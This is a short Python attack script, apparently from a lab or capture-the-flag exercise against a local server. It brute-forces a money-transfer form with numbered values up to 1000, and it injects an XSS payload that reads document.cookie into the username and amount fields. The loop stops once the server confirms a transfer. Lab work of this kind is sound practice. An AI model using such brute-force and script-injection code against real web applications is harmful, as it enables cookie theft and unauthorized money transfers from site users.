import requests

for i in range(1001):
    data = {
        "userName": "{:03d}".format(i) + "<script>alert(document.cookie)<script>",
        "moneyAmount": "{:03d}".format(i) + "<script>alert(document.cookie)<script>",
        "submit": "submit"
    }

    try:
        session = requests.Session()
        response = session.post("http://127.0.0.1:2223/Q4", data=data)
        if "Money has been transfered!" in response.text:
            print("Success: " + "{:03d}".format(i))
            break
        else:
            print("Failed: " + "{:03d}".format(i))
    except requests.exceptions.RequestException as e:
        print("Error connecting to the remote server.")
